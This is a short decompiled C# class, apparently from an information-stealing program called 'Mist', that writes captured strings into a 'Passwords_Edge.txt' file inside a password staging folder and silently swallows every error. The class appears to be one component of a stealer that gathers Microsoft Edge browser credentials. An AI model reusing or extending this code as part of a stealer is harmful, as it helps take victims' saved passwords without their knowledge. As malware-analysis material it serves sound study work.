using System;
using System.Collections.Generic;
using System.IO;

namespace Mist
{
	// Token: 0x02000029 RID: 41
	public static class DesktopWriter
	{
		// Token: 0x060000CD RID: 205 RVA: 0x0000B9E0 File Offset: 0x00009BE0
		public static void SetDirectory(string dir)
		{
			try
			{
				DesktopWriter.directory = Help.Passwords;
			}
			catch
			{
			}
		}

		// Token: 0x060000CE RID: 206 RVA: 0x0000BA0C File Offset: 0x00009C0C
		public static void WriteLine(string str)
		{
			try
			{
				File.AppendAllLines(Path.Combine(DesktopWriter.directory, "Passwords_Edge.txt"), new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}

		// Token: 0x04000081 RID: 129
		private static string directory = "";
	}
}
